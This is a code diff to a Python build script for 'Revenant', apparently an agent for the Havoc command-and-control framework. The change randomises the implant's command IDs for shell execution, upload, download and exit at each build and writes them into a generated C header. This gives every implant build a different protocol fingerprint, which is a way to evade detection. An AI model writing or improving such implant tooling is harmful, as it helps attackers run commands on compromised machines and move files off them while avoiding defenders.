@@ -10,14 +10,54 @@ from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 
-COMMAND_REGISTER: int = 0x100
-COMMAND_GET_JOB: int = 0x101
-COMMAND_NO_JOB: int = 0x102
-COMMAND_SHELL: int = 0x152
-COMMAND_UPLOAD: int = 0x153
-COMMAND_DOWNLOAD: int = 0x154
-COMMAND_EXIT: int = 0x155
-COMMAND_OUTPUT: int = 0x200
+def generate_command_constants():
+    COMMAND_REGISTER = random.randint(0, 0xFFFF)
+    COMMAND_GET_JOB = random.randint(0, 0xFFFF)
+    COMMAND_NO_JOB = random.randint(0, 0xFFFF)
+    COMMAND_SHELL = random.randint(0, 0xFFFF)
+    COMMAND_UPLOAD = random.randint(0, 0xFFFF)
+    COMMAND_DOWNLOAD = random.randint(0, 0xFFFF)
+    COMMAND_EXIT = random.randint(0, 0xFFFF)
+    COMMAND_OUTPUT = random.randint(0, 0xFFFF)
+
+    return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
+
+
+COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT = generate_command_constants()
+
+
+def write_command_header_file():
+
+    header_file_contents = f"""#ifndef REVENANT_COMMAND_H
+#define REVENANT_COMMAND_H
+
+#include <windows.h>
+#include "Parser.h"
+
+#define COMMAND_REGISTER         {COMMAND_REGISTER}
+#define COMMAND_GET_JOB          {COMMAND_GET_JOB}
+#define COMMAND_NO_JOB           {COMMAND_NO_JOB}
+#define COMMAND_SHELL            {COMMAND_SHELL}
+#define COMMAND_UPLOAD           {COMMAND_UPLOAD}
+#define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
+#define COMMAND_EXIT             {COMMAND_EXIT}
+#define COMMAND_OUTPUT           {COMMAND_OUTPUT}
+
+typedef struct {{
+    INT ID;
+    VOID (*Function)(PPARSER Arguments);
+}} RVNT_COMMAND;
+
+VOID CommandDispatcher();
+VOID CommandShell(PPARSER Parser);
+VOID CommandUpload(PPARSER Parser);
+VOID CommandDownload(PPARSER Parser);
+VOID CommandExit(PPARSER Parser);
+
+#endif //REVENANT_COMMAND_H
+"""
+    with open("./Include/Command.h", "w") as file:
+        file.write(header_file_contents)
 
 
 GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
@@ -600,6 +640,7 @@ def process_directory(directory_path, instructions, remove=False):
 
 
 def main():
+    write_command_header_file()
     havoc_revenant: Revenant = Revenant()
 
     print("[*] Connect to Havoc service api")
